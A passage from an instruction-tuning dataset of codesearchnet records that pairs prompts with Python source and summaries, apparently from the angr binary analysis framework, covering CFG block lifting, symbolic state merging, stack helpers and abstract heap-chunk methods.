wrong?\n                nodecode = False\n                if addr % 2 == 0:\n                    addr_0 = addr + 1\n                else:\n                    addr_0 = addr - 1\n\n                if addr_0 in self._nodes:\n                    # it has been analyzed before\n                    cfg_node = self._nodes[addr_0]\n                    irsb = cfg_node.irsb\n                    return addr_0, cfg_node.function_address, cfg_node, irsb\n\n                try:\n                    lifted_block = self._lift(addr_0, size=distance, opt_level=self._iropt_level,\n                                              collect_data_refs=True)\n                    irsb = lifted_block.vex_nostmt\n                    irsb_string = lifted_block.bytes[:irsb.size]\n                except SimTranslationError:\n                    nodecode = True\n\n                if not (nodecode or irsb.size == 0 or irsb.jumpkind == 'Ijk_NoDecode'):\n                    # it is decodeable\n                    if current_function_addr == addr:\n                        current_function_addr = addr_0\n                    addr = addr_0\n\n            if nodecode or irsb.size == 0 or irsb.jumpkind == 'Ijk_NoDecode':\n                # decoding error\n                # we still occupy that location since it cannot be decoded anyways\n                if irsb is None:\n                    irsb_size = 0\n                else:\n                    irsb_size = irsb.size\n                # special handling for ud, ud1, and ud2 on x86 and x86-64\n                if is_x86_x64_arch \\\n                        and len(irsb_string) >= 2 \\\n                        and irsb_string[-2:] in {\n                            b'\\x0f\\xff',  # ud0\n                            b'\\x0f\\xb9',  # ud1\n                            b'\\x0f\\x0b',  # ud2\n                        }:\n                    # ud0, ud1, and ud2 are actually valid instructions.\n                    valid_ins = True\n                    nodecode_size = 2\n                else:\n                    valid_ins = False\n                    nodecode_size = 1\n                self._seg_list.occupy(addr, irsb_size, 'code')\n                self._seg_list.occupy(addr + irsb_size, nodecode_size, 'nodecode')\n                if not valid_ins:\n                    l.error(\"Decoding error occurred at address %#x of function %#x.\",\n                            addr + irsb_size,\n                            current_function_addr\n                            )\n                    return None, None, None, None\n\n            is_thumb = False\n            # Occupy the block in segment list\n            if irsb.size > 0:\n                if is_arm_arch(self.project.arch) and addr % 2 == 1:\n                    # thumb mode\n                    is_thumb=True\n                self._seg_list.occupy(real_addr, irsb.size, \"code\")\n\n            # Create a CFG node, and add it to the graph\n            cfg_node = CFGNode(addr, irsb.size, self.model,\n                               function_address=current_function_addr,\n                               block_id=addr,\n                               irsb=irsb,\n                               thumb=is_thumb,\n                               byte_string=irsb_string,\n                               )\n            if self._cfb is not None:\n                self._cfb.add_obj(addr, lifted_block)\n\n            self._nodes[addr] = cfg_node\n            self._nodes_by_addr[addr].append(cfg_node)\n\n            return addr, current_function_addr, cfg_node, irsb\n\n        except (SimMemoryError, SimEngineError):\n            return None, None, None, None"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nprocess the arch specific block.", "response": "def _process_block_arch_specific(self, addr, irsb, func_addr):  # pylint: disable=unused-argument\n        \"\"\"\n        According to arch types ['ARMEL', 'ARMHF', 'MIPS32'] does different\n        fixes\n\n        For ARM deals with link register on the stack\n        (see _arm_track_lr_on_stack)\n        For MIPS32 simulates a new state where the global pointer is 0xffffffff\n        from current address after three steps if the first successor does not\n        adjust this value updates this function address (in function manager)\n        to use a conrete global pointer\n\n        :param int addr: irsb address\n        :param pyvex.IRSB irsb: irsb\n        :param func_addr: function address\n        :return: None\n        \"\"\"\n        if is_arm_arch(self.project.arch):\n            if self._arch_options.ret_jumpkind_heuristics:\n                if addr == func_addr:\n                    self._arm_track_lr_on_stack(addr, irsb, self.functions[func_addr])\n\n                elif 'lr_saved_on_stack' in self.functions[func_addr].info and \\\n                        self.functions[func_addr].info['lr_saved_on_stack'] and \\\n                        irsb.jumpkind == 'Ijk_Boring' and \\\n                        irsb.next is not None and \\\n                        isinstance(irsb.next, pyvex.IRExpr.RdTmp):\n                    # do a bunch of checks to avoid unnecessary simulation from happening\n                    self._arm_track_read_lr_from_stack(irsb, self.functions[func_addr])\n\n        elif self.project.arch.name == \"MIPS32\":\n            function = self.kb.functions.function(func_addr)\n            if addr >= func_addr and addr - func_addr < 15 * 4 and 'gp' not in function.info:\n                # check if gp is being written to\n                last_gp_setting_insn_id = None\n                insn_ctr = 0\n\n                if not irsb.statements:\n                    # Get an IRSB with statements\n\n                    irsb = self.project.factory.block(irsb.addr, size=irsb.size).vex\n\n                for stmt in irsb.statements:\n                    if isinstance(stmt, pyvex.IRStmt.IMark):\n                        insn_ctr += 1\n                        if insn_ctr >= 10:\n                            break\n                    elif isinstance(stmt, pyvex.IRStmt.Put) and stmt.offset == self.project.arch.registers['gp'][0]:\n                        last_gp_setting_insn_id = insn_ctr\n                        break\n\n                if last_gp_setting_insn_id is None:\n                    return\n\n                # Prudently search for $gp values\n                state = self.project.factory.blank_state(addr=addr, mode=\"fastpath\",\n                                                         remove_options={o.OPTIMIZE_IR}\n                                                         )\n                state.regs.t9 = func_addr\n                state.regs.gp = 0xffffffff\n                succ = self.project.factory.successors(state, num_inst=last_gp_setting_insn_id + 1)\n\n                if not succ.flat_successors:\n                    return\n\n                state = succ.flat_successors[0]\n                if not state.regs.gp.symbolic and state.solver.is_false(state.regs.gp == 0xffffffff):\n                    function.info['gp'] = state.regs.gp._model_concrete.value"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ngenerating a list of all recovered basic blocks.", "response": "def generate_code_cover(self):\n        \"\"\"\n        Generate a list of all recovered basic blocks.\n        \"\"\"\n\n        lst = []\n        for cfg_node in self.graph.nodes():\n            size = cfg_node.size\n            lst.append((cfg_node.addr, size))\n\n        lst = sorted(lst, key=lambda x: x[0])\n        return lst"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef se(self):\n        global _complained_se\n        if not _complained_se:\n            _complained_se = True\n            l.critical(\"The name state.se is deprecated; please use state.solver.\")\n        return self.get_plugin('solver')", "response": "Deprecated alias for solver"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nreturn the concrete address of the instruction pointer without triggering SimInspect breakpoints or generating SimActions.", "response": "def addr(self):\n        \"\"\"\n        Get the concrete address of the instruction pointer, without triggering SimInspect breakpoints or generating\n        SimActions. An integer is returned, or an exception is raised if the instruction pointer is symbolic.\n\n        :return: an int\n        \"\"\"\n\n        ip = self.regs._ip\n        if isinstance(ip, SootAddressDescriptor):\n            return ip\n        return self.solver.eval_one(self.regs._ip)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef add_constraints(self, *args, **kwargs):\n        if len(args) > 0 and isinstance(args[0], (list, tuple)):\n            raise Exception(\"Tuple or list passed to add_constraints!\")\n\n        if o.TRACK_CONSTRAINTS in self.options and len(args) > 0:\n            if o.SIMPLIFY_CONSTRAINTS in self.options:\n                constraints = [ self.simplify(a) for a in args ]\n            else:\n                constraints = args\n\n            self._inspect('constraints', BP_BEFORE, added_constraints=constraints)\n            constraints = self._inspect_getattr(\"added_constraints\", constraints)\n            added = self.solver.add(*constraints)\n            self._inspect('constraints', BP_AFTER)\n\n            # add actions for the added constraints\n            if o.TRACK_CONSTRAINT_ACTIONS in self.options:\n                for c in added:\n                    sac = SimActionConstraint(self, c)\n                    self.history.add_action(sac)\n        else:\n            # preserve the old action logic for when we don't track constraints (why?)\n            if (\n                'action' in kwargs and kwargs['action'] and\n                o.TRACK_CONSTRAINT_ACTIONS in self.options and len(args) > 0\n            ):\n                for arg in args:\n                    if self.solver.symbolic(arg):\n                        sac = SimActionConstraint(self, arg)\n                        self.history.add_action(sac)\n\n        if o.ABSTRACT_SOLVER in self.options and len(args) > 0:\n            for arg in args:\n                if self.solver.is_false(arg):\n                    self._satisfiable = False\n                    return\n\n                if self.solver.is_true(arg):\n                    continue\n\n                # `is_true` and `is_false` does not use VSABackend currently (see commits 97a75366 and 2dfba73e in\n                # claripy). There is a chance that VSA backend can in fact handle it.\n                # Therefore we try to resolve it with VSABackend again\n                if claripy.backends.vsa.is_false(arg):\n                    self._satisfiable = False\n                    return\n\n                if claripy.backends.vsa.is_true(arg):\n                    continue\n\n                # It's neither True or False. Let's try to apply the condition\n\n                # We take the argument, extract a list of constrained SIs out of it (if we could, of course), and\n                # then replace each original SI the intersection of original SI and the constrained one.\n\n                _, converted = self.solver.constraint_to_si(arg)\n\n                for original_expr, constrained_si in converted:\n                    if not original_expr.variables:\n                        l.error('Incorrect original_expression to replace in add_constraints(). '\n                                'This is due to defects in VSA logics inside claripy. Please report '\n                                'to Fish and he will fix it if he\\'s free.')\n                        continue\n\n                    new_expr = constrained_si\n                    self.registers.replace_all(original_expr, new_expr)\n                    for _, region in self.memory.regions.items():\n                        region.memory.replace_all(original_expr, new_expr)\n\n                    l.debug(\"SimState.add_constraints: Applied to final state.\")\n        elif o.SYMBOLIC not in self.options and len(args) > 0:\n            for arg in args:\n                if self.solver.is_false(arg):\n                    self._satisfiable = False\n                    return", "response": "Add some constraints to the state."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nreturns True if the state s constraints are satisfiable.", "response": "def satisfiable(self, **kwargs):\n        \"\"\"\n        Whether the state's constraints are satisfiable\n        \"\"\"\n        if o.ABSTRACT_SOLVER in self.options or o.SYMBOLIC not in self.options:\n            extra_constraints = kwargs.pop('extra_constraints', ())\n            for e in extra_constraints:\n                if self.solver.is_false(e):\n                    return False\n\n            return self._satisfiable\n        else:\n            return self.solver.satisfiable(**kwargs)"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef block(self, *args, **kwargs):\n        if not args and 'addr' not in kwargs:\n            kwargs['addr'] = self.addr\n        return self.project.factory.block(*args, backup_state=self, **kwargs)", "response": "Returns a basic block at this point."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nreturning a copy of the state.", "response": "def copy(self):\n        \"\"\"\n        Returns a copy of the state.\n        \"\"\"\n\n        if self._global_condition is not None:\n            raise SimStateError(\"global condition was not cleared before state.copy().\")\n\n        c_plugins = self._copy_plugins()\n        state = SimState(project=self.project, arch=self.arch, plugins=c_plugins, options=self.options.copy(),\n                         mode=self.mode, os_name=self.os_name)\n\n        if self._is_java_jni_project:\n            state.ip_is_soot_addr = self.ip_is_soot_addr\n\n        state.uninitialized_access_handler = self.uninitialized_access_handler\n        state._special_memory_filler = self._special_memory_filler\n        state.ip_constraints = self.ip_constraints\n\n        return state"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nmerge this state with the other state.", "response": "def merge(self, *others, **kwargs):\n        \"\"\"\n        Merges this state with the other states. Returns the merging result, merged state, and the merge flag.\n\n        :param states: the states to merge\n        :param merge_conditions: a tuple of the conditions under which each state holds\n        :param common_ancestor:  a state that represents the common history between the states being merged. Usually it\n                                 is only available when EFFICIENT_STATE_MERGING is enabled, otherwise weak-refed states\n                                 might be dropped from state history instances.\n        :param plugin_whitelist: a list of plugin names that will be merged. If this option is given and is not None,\n                                 any plugin that is not inside this list will not be merged, and will be created as a\n                                 fresh instance in the new state.\n        :param common_ancestor_history:\n                                 a SimStateHistory instance that represents the common history between the states being\n                                 merged. This is to allow optimal state merging when EFFICIENT_STATE_MERGING is\n                                 disabled.\n        :return: (merged state, merge flag, a bool indicating if any merging occured)\n        \"\"\"\n\n        merge_conditions = kwargs.pop('merge_conditions', None)\n        common_ancestor = kwargs.pop('common_ancestor', None)\n        plugin_whitelist = kwargs.pop('plugin_whitelist', None)\n        common_ancestor_history = kwargs.pop('common_ancestor_history', None)\n\n        if len(kwargs) != 0:\n            raise ValueError(\"invalid arguments: %s\" % kwargs.keys())\n\n        if merge_conditions is None:\n            # TODO: maybe make the length of this smaller? Maybe: math.ceil(math.log(len(others)+1, 2))\n            merge_flag = self.solver.BVS(\"state_merge_%d\" % next(merge_counter), 16)\n            merge_values = range(len(others)+1)\n            merge_conditions = [ merge_flag == b for b in merge_values ]\n        else:\n            merge_conditions = [\n                (self.solver.true if len(mc) == 0 else self.solver.And(*mc)) for mc in merge_conditions\n            ]\n\n        if len(set(o.arch.name for o in others)) != 1:\n            raise SimMergeError(\"Unable to merge due to different architectures.\")\n\n        all_plugins = set(self.plugins.keys()) | set.union(*(set(o.plugins.keys()) for o in others))\n\n        if plugin_whitelist is not None:\n            all_plugins = all_plugins.intersection(set(plugin_whitelist))\n\n        merged = self.copy()\n        merging_occurred = False\n\n        # fix parent\n        merged.history.parent = self.history\n\n        # plugins\n        for p in all_plugins:\n            our_plugin = merged.plugins[p] if p in merged.plugins else None\n            their_plugins = [ (pl.plugins[p] if p in pl.plugins else None) for pl in others ]\n\n            plugin_classes = (\n                set([our_plugin.__class__]) | set(pl.__class__ for pl in their_plugins)\n            ) - set([None.__class__])\n            if len(plugin_classes) != 1:\n                raise SimMergeError(\n                    \"There are differing plugin classes (%s) for plugin %s\" % (plugin_classes, p)\n                )\n            plugin_class = plugin_classes.pop()\n\n            our_filled_plugin = our_plugin if our_plugin is not None else merged.register_plugin(\n                p, plugin_class()\n            )\n            their_filled_plugins = [\n                (tp if tp is not None else t.register_plugin(p, plugin_class()))\n                for t,tp in zip(others, their_plugins)\n            ]\n\n            plugin_common_ancestor = (\n                common_ancestor.plugins[p] if\n                (common_ancestor is not None and p in common_ancestor.plugins) else\n                None\n            )\n            if plugin_common_ancestor is None and \\\n                    plugin_class is SimStateHistory and \\\n                    common_ancestor_history is not None:\n                plugin_common_ancestor = common_ancestor_history\n\n            plugin_state_merged = our_filled_plugin.merge(\n                their_filled_plugins, merge_conditions, common_ancestor=plugin_common_ancestor,\n            )\n            if plugin_state_merged:\n                l.debug('Merging occurred in %s', p)\n                merging_occurred = True\n\n        merged.add_constraints(merged.solver.Or(*merge_conditions))\n        return merged, merge_conditions, merging_occurred"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nperforms a widening between self and others.", "response": "def widen(self, *others):\n        \"\"\"\n        Perform a widening between self and other states\n        :param others:\n        :return:\n        \"\"\"\n\n        if len(set(frozenset(o.plugins.keys()) for o in others)) != 1:\n            raise SimMergeError(\"Unable to widen due to different sets of plugins.\")\n        if len(set(o.arch.name for o in others)) != 1:\n            raise SimMergeError(\"Unable to widen due to different architectures.\")\n\n        widened = self.copy()\n        widening_occurred = False\n\n        # plugins\n        for p in self.plugins:\n            if p in ('solver', 'unicorn'):\n                continue\n            plugin_state_widened = widened.plugins[p].widen([_.plugins[p] for _ in others])\n            if plugin_state_widened:\n                l.debug('Widening occured in %s', p)\n                widening_occurred = True\n\n        return widened, widening_occurred"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef reg_concrete(self, *args, **kwargs):\n        e = self.registers.load(*args, **kwargs)\n        if self.solver.symbolic(e):\n            raise SimValueError(\"target of reg_concrete is symbolic!\")\n        return self.solver.eval(e)", "response": "Returns the contents of a register but raises a SimValueError."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nreturn the contents of a memory object but raises a SimValueError if the contents are symbolic.", "response": "def mem_concrete(self, *args, **kwargs):\n        \"\"\"\n        Returns the contents of a memory but, if the contents are symbolic,\n        raises a SimValueError.\n        \"\"\"\n        e = self.memory.load(*args, **kwargs)\n        if self.solver.symbolic(e):\n            raise SimValueError(\"target of mem_concrete is symbolic!\")\n        return self.solver.eval(e)"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef stack_push(self, thing):\n        # increment sp\n        sp = self.regs.sp + self.arch.stack_change\n        self.regs.sp = sp\n        return self.memory.store(sp, thing, endness=self.arch.memory_endness)", "response": "Push a thing onto the stack and adjust the stack pointer."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\npopping from the stack and returns the popped thing.", "response": "def stack_pop(self):\n        \"\"\"\n        Pops from the stack and returns the popped thing. The length will be the architecture word size.\n        \"\"\"\n        sp = self.regs.sp\n        self.regs.sp = sp - self.arch.stack_change\n        return self.memory.load(sp, self.arch.bytes, endness=self.arch.memory_endness)"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nreads length bytes at an offset into the stack.", "response": "def stack_read(self, offset, length, bp=False):\n        \"\"\"\n        Reads length bytes, at an offset into the stack.\n\n        :param offset:  The offset from the stack pointer.\n        :param length:  The number of bytes to read.\n        :param bp:      If True, offset from the BP instead of the SP. Default: False.\n        \"\"\"\n        sp = self.regs.bp if bp else self.regs.sp\n        return self.memory.load(sp+offset, length, endness=self.arch.memory_endness)"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nconverts each stack value to a string", "response": "def _stack_values_to_string(self, stack_values):\n        \"\"\"\n        Convert each stack value to a string\n\n        :param stack_values: A list of values\n        :return: The converted string\n        \"\"\"\n\n        strings = [ ]\n        for stack_value in stack_values:\n            if self.solver.symbolic(stack_value):\n                concretized_value = \"SYMBOLIC - %s\" % repr(stack_value)\n            else:\n                if len(self.solver.eval_upto(stack_value, 2)) == 2:\n                    concretized_value = repr(stack_value)\n                else:\n                    concretized_value = repr(stack_value)\n            strings.append(concretized_value)\n\n        return \" .. \".join(strings)"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef dbg_print_stack(self, depth=None, sp=None):\n\n        var_size = self.arch.bytes\n        sp_sim = self.regs._sp\n        bp_sim = self.regs._bp\n        if self.solver.symbolic(sp_sim) and sp is None:\n            result = \"SP is SYMBOLIC\"\n        elif self.solver.symbolic(bp_sim) and depth is None:\n            result = \"BP is SYMBOLIC\"\n        else:\n            sp_value = sp if sp is not None else self.solver.eval(sp_sim)\n            if self.solver.symbolic(bp_sim):\n                result = \"SP = 0x%08x, BP is symbolic\\n\" % (sp_value)\n                bp_value = None\n            else:\n                bp_value = self.solver.eval(bp_sim)\n                result = \"SP = 0x%08x, BP = 0x%08x\\n\" % (sp_value, bp_value)\n            if depth is None:\n                # bp_value cannot be None here\n                depth = (bp_value - sp_value) // var_size + 1 # Print one more value\n            pointer_value = sp_value\n            for i in range(depth):\n                # For AbstractMemory, we wanna utilize more information from VSA\n                stack_values = [ ]\n\n                if o.ABSTRACT_MEMORY in self.options:\n                    sp = self.regs._sp\n                    segment_sizes = self.memory.get_segments(sp + i * var_size, var_size)\n\n                    pos = i * var_size\n                    for segment_size in segment_sizes:\n                        stack_values.append(self.stack_read(pos, segment_size, bp=False))\n                        pos += segment_size\n                else:\n                    stack_values.append(self.stack_read(i * var_size, var_size, bp=False))\n\n                # Convert it into a big string!\n                val = self._stack_values_to_string(stack_values)\n\n                if pointer_value == sp_value:\n                    line = \"(sp)% 16x | %s\" % (pointer_value, val)\n                elif pointer_value == bp_value:\n                    line = \"(bp)% 16x | %s\" % (pointer_value, val)\n                else:\n                    line = \"% 20x | %s\" % (pointer_value, val)\n\n                pointer_value += var_size\n                result += line + \"\\n\"\n        return result", "response": "Print the current stack frame in a string."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _conc_alloc_size(self, sim_size):\n        if self.state.solver.symbolic(sim_size):\n            size = self.state.solver.max_int(sim_size)\n            if size > self.state.libc.max_variable_size:\n                l.warning(\"Allocation request of %d bytes exceeded maximum of %d bytes; allocating %d bytes\",\n                          size, self.state.libc.max_variable_size, size)\n                size = self.state.libc.max_variable_size\n        else:\n            size = self.state.solver.eval(sim_size)\n        return size", "response": "Concretizes a size argument to something that makes sense when allocating space. This function is used to allocate a new size for a new entry in the heap."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _calloc(self, sim_nmemb, sim_size):\n        raise NotImplementedError(\"%s not implemented for %s\" % (self._calloc.__func__.__name__,\n                                                                 self.__class__.__name__))", "response": "Handler for any libc calloc SimProcedure call."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nconverting multiple supported forms of stack pointer representations into stack offsets.", "response": "def parse_stack_pointer(sp):\n    \"\"\"\n    Convert multiple supported forms of stack pointer representations into stack offsets.\n\n    :param sp:  A stack pointer representation.\n    :return:    A stack pointer offset.\n    :rtype:     int\n    \"\"\"\n    if isinstance(sp, int):\n        return sp\n\n    if isinstance(sp, StackBaseOffset):\n        return sp.offset\n\n    if isinstance(sp, BinaryOp):\n        op0, op1 = sp.operands\n        off0 = parse_stack_pointer(op0)\n        off1 = parse_stack_pointer(op1)\n        if sp.op == \"Sub\":\n            return off0 - off1\n        elif sp.op == \"Add\":\n            return off0 + off1\n\n    raise NotImplementedError(\"Unsupported stack pointer representation type %s.\" % type(sp))"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef get_variable_definitions(self, block_addr):\n\n        if block_addr in self._outstates:\n            return self._outstates[block_addr].variables\n        return set()", "response": "Get variables that are defined at the specified block."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _phi_node_contains(self, phi_variable, variable):\n\n        if self.variable_manager[self.function.addr].is_phi_variable(phi_variable):\n            return variable in self.variable_manager[self.function.addr].get_phi_subvariables(phi_variable)\n        return False", "response": "Checks if the phi variable contains variable as a sub - variable."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nreturning the lineage of histories leading up to h.", "response": "def lineage(self, h):\n        \"\"\"\n        Returns the lineage of histories leading up to `h`.\n        \"\"\"\n\n        lineage = [ ]\n\n        predecessors = list(self._graph.predecessors(h))\n        while len(predecessors):\n            lineage.append(predecessors[0])\n            predecessors = list(self._graph.predecessors(predecessors[0]))\n\n        lineage.reverse()\n        return lineage"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef most_mergeable(self, states):\n\n        histories = set(self.get_ref(s.history) for s in states)\n\n        for n in networkx.algorithms.dfs_postorder_nodes(self._graph):\n            intersection = histories.intersection(self.all_successors(n))\n            if len(intersection) > 1:\n                return (\n                    [ s for s in states if self.get_ref(s.history) in intersection ],\n                    n(),\n                    [ s for s in states if self.get_ref(s.history) not in intersection ]\n                )\n\n        # didn't find any?\n        return set(), None, states", "response": "Find the most mergeable set of states from those provided."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef process(self, state, *args, **kwargs):\n        inline = kwargs.pop('inline', False)\n        force_addr = kwargs.pop('force_addr', None)\n\n        ip = state._ip\n        addr = (ip if isinstance(ip, SootAddressDescriptor) else state.solver.eval(ip)) \\\n            if force_addr is None else force_addr\n\n        # make a copy of the initial state for actual processing, if needed\n        if not inline and o.COPY_STATES in state.options:\n            new_state = state.copy()\n        else:\n            new_state = state\n        # enforce this distinction\n        old_state = state\n        del state\n\n        # we have now officially begun the stepping process! now is where we \"cycle\" a state's\n        # data - move the \"present\" into the \"past\" by pushing an entry on the history stack.\n        # nuance: make sure to copy from the PREVIOUS state to the CURRENT one\n        # to avoid creating a dead link in the history, messing up the statehierarchy\n        new_state.register_plugin('history', old_state.history.make_child())\n        new_state.history.recent_bbl_addrs.append(addr)\n        if new_state.arch.unicorn_support:\n            new_state.scratch.executed_pages_set = {addr & ~0xFFF}\n\n        successors = SimSuccessors(addr, old_state)\n\n        new_state._inspect('engine_process', when=BP_BEFORE, sim_engine=self, sim_successors=successors, address=addr)\n        successors = new_state._inspect_getattr('sim_successors', successors)\n        try:\n            self._process(new_state, successors, *args, **kwargs)\n        except SimException:\n            if o.EXCEPTION_HANDLING not in old_state.options:\n                raise\n            old_state.project.simos.handle_exception(successors, self, *sys.exc_info())\n\n        new_state._inspect('engine_process', when=BP_AFTER, sim_successors=successors, address=addr)\n        successors = new_state._inspect_getattr('sim_successors', successors)\n\n        # downsizing\n        if new_state.supports_inspect:\n            new_state.inspect.downsize()\n        # if not TRACK, clear actions on OLD state\n        #if o.TRACK_ACTION_HISTORY not in old_state.options:\n        #    old_state.history.recent_events = []\n\n        # fix up the descriptions...\n        description = str(successors)\n        l.info(\"Ticked state: %s\", description)\n        for succ in successors.all_successors:\n            succ.history.recent_description = description\n        for succ in successors.flat_successors:\n            succ.history.recent_description = description\n\n        return successors", "response": "This method is called by the engine to process the state."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ncheck if this engine can be used for execution on the current state.", "response": "def check(self, state, *args, **kwargs):\n        \"\"\"\n        Check if this engine can be used for execution on the current state. A callback `check_failure` is called upon\n        failed checks. Note that the execution can still fail even if check() returns True.\n\n        You should only override this method in a subclass in order to provide the correct method signature and\n        docstring. You should override the ``_check`` method to do your actual execution.\n\n        :param SimState state: The state with which to execute.\n        :param args:                   Positional arguments that will be passed to process().\n        :param kwargs:                 Keyword arguments that will be passed to process().\n        :return:                       True if the state can be handled by the current engine, False otherwise.\n        \"\"\"\n\n        return self._check(state, *args, **kwargs)"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nchecks if the resolved target is valid.", "response": "def _is_target_valid(self, cfg, target):  # pylint:disable=no-self-use\n        \"\"\"\n        Check if the resolved target is valid.\n\n        :param cfg:         The CFG analysis object.\n        :param int target:  The target to check.\n        :return:            True if the target is valid. False otherwise.\n        :rtype:             bool\n        \"\"\"\n\n        if self.base_state is not None:\n            try:\n                if self.base_state.solver.is_true((self.base_state.memory.permissions(target) & 4) == 4):\n                    return True\n            except SimMemoryError:\n                pass\n            return False\n\n        if cfg._addr_in_exec_memory_regions(target):\n            # the jump target is executable\n            return True\n        if self.project.is_hooked(target):\n            # the jump target is hooked\n            return True\n        return False"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nexecuting the base execution of the base execution.", "response": "def process(self, state,\n            step=None,\n            extra_stop_points=None,\n            inline=False,\n            force_addr=None,\n            **kwargs):\n        \"\"\"\n        :param state:               The state with which to execute\n        :param step:                How many basic blocks we want to execute\n        :param extra_stop_points:   A collection of addresses at which execution should halt\n        :param inline:              This is an inline execution. Do not bother copying the state.\n        :param force_addr:          Force execution to pretend that we're working at this concrete\n                                    address\n        :returns:                   A SimSuccessors object categorizing the results of the run and\n                                    whether it succeeded.\n        \"\"\"\n        return super(SimEngineUnicorn, self).process(state,\n                step=step,\n                extra_stop_points=extra_stop_points,\n                inline=inline,\n                force_addr=force_addr)"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef get_size(self):\n        raise NotImplementedError(\"%s not implemented for %s\" % (self.get_size.__func__.__name__,\n                                                                 self.__class__.__name__))", "response": "Returns the actual size of a resource."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nset the size of the chunk preserving any flags.", "response": "def set_size(self, size):\n        \"\"\"\n        Sets the size of the chunk, preserving any flags.\n        \"\"\"\n        raise NotImplementedError(\"%s not implemented for %s\" % (self.set_size.__func__.__name__,\n                                                                 self.__class__.__name__))"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef data_ptr(self):\n        raise NotImplementedError(\"%s not implemented for %s\" % (self.data_ptr.__func__.__name__,\n                                                                 self.__class__.__name__))", "response": "Returns the address of the payload of the chunk."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef is_free(self):\n        raise NotImplementedError(\"%s not implemented for %s\" % (self.is_free.__func__.__name__,\n                                                                 self.__class__.__name__))", "response": "Returns a concrete determination as to whether the chunk is free."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nreturns the next chunk in the sequence immediately following this one.", "response": "def next_chunk(self):\n        \"\"\"\n        Returns the chunk immediately following (and adjacent to) this one.\n        \"\"\"\n        raise NotImplementedError(\"%s not implemented for %s\" % (self.next_chunk.__func__.__name__,\n                                                                 self.__class__.__name__))"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nreturns the chunk immediately prior to this one.", "response": "def prev_chunk(self):\n        \"\"\"\n        Returns the chunk immediately prior (and adjacent) to this one.\n        \"\"\"\n        raise NotImplementedError(\"%s not implemented for %s\" % (self.prev_chunk.__func__.__name__,\n                                                                 self.__class__.__name__))"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef fwd_chunk(self):\n        raise NotImplementedError(\"%s not implemented for %s\" % (self.fwd_chunk.__func__.__name__,\n                                                                 self.__class__.__name__))", "response": "Returns the next free chunk in the list of free chunks."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nsets the chunk following this chunk in the free chunks list.", "response": "def set_fwd_chunk(self, fwd):\n        \"\"\"\n        Sets the chunk following this chunk in the list of free chunks.\n\n        :param fwd: the chunk to follow this chunk in the list of free chunks\n        \"\"\"\n        raise NotImplementedError(\"%s not implemented for %s\" % (self.set_fwd_chunk.__func__.__name__,\n                                                                 self.__class__.__name__))"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef bck_chunk(self):\n        raise NotImplementedError(\"%s not implemented for %s\" % (self.bck_chunk.__func__.__name__,\n                                                                 self.__class__.__name__))", "response": "Returns the chunk backward from this chunk in the list of free chunks."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nset the chunk backward from this chunk in the free chunks list.", "response": "def set_bck_chunk(self, bck):\n        \"\"\"\n        Sets the chunk backward from this chunk in the list of free chunks.\n\n        :param bck: the chunk to precede this chunk in the list of free chunks\n        \"\"\"\n        raise NotImplementedError(\"%s not implemented for %s\" % (self.set_bck_chunk.__func__.__name__,\n                                                                 self.__class__.__name__))"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nreturn an iterator over all the chunks in the heap.", "response": "def chunks(self):\n        \"\"\"\n        Returns an iterator over all the chunks in the heap.\n        \"\"\"\n        raise NotImplementedError(\"%s not implemented for %s\" % (self.chunks.__func__.__name__,\n                                                                 self.__class__.__name__))"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef allocated_chunks(self):\n        raise NotImplementedError(\"%s not implemented for %s\" % (self.allocated_chunks.__func__.__name__,\n                                                                 self.__class__.__name__))", "response": "Returns an iterator over all the allocated chunks in the heap."}
